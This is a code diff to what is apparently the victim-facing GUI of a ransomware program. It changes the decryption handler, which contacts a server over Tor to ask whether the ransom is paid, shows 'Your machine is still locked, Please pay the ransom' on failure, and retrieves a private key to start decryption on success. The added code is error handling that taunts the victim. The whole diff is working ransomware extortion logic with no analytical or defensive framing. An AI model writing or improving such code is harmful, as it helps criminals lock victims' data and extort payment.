@@ -8,6 +8,7 @@ import Config
 import json
 import base64
 import DecryptThread
+import requests
 
 
 class GUI(QWidget):
@@ -63,15 +64,19 @@ class GUI(QWidget):
         self.btnDecrypt.clicked.connect(self.decryptData)
 
     def decryptData(self):
-        self.progressBar.show()
         tor = TorManager()
         r = tor.getSession()
-        req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
-        data = json.loads(req.text)
-        if data['STATUS'] == "FAIL":
-            QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
-        elif data['STATUS'] == "SUCCESS":
-            privkey = base64.b64decode(data['priv_key']).decode('utf-8')
+        try:
+            req = r.get(Config.API_URL + "/decrypt/" + self.uuid)
+            data = json.loads(req.text)
+            if data['STATUS'] == "FAIL":
+                QMessageBox.question(self, "Still locked...", "Your machine is still locked\nPlease pay the ransom", QMessageBox.Ok)
+            elif data['STATUS'] == "SUCCESS":
+                self.progressBar.show()
+                privkey = base64.b64decode(data['priv_key']).decode('utf-8')
 
-            self.decryptThread = DecryptThread.DecryptThread(privkey)
-            self.decryptThread.start()
+                self.decryptThread = DecryptThread.DecryptThread(privkey)
+                self.decryptThread.start()
+        except requests.exceptions.RequestException:
+            QMessageBox.question(self, "Error", "You are fucked...",
+                                 QMessageBox.Ok)
